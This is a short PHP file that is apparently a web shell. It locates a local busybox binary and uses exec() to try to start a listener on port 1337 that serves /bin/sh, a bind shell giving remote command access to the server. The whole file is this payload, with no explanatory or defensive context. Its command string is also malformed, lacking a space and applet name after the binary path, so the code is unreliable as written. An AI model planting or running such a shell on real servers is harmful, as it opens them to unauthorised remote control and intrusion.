<?php

echo file_exists(realpath("busybox"));
$file = realpath("busybox");
echo "<br />";
exec($file . "-p 1337 -l /bin/sh");

?>
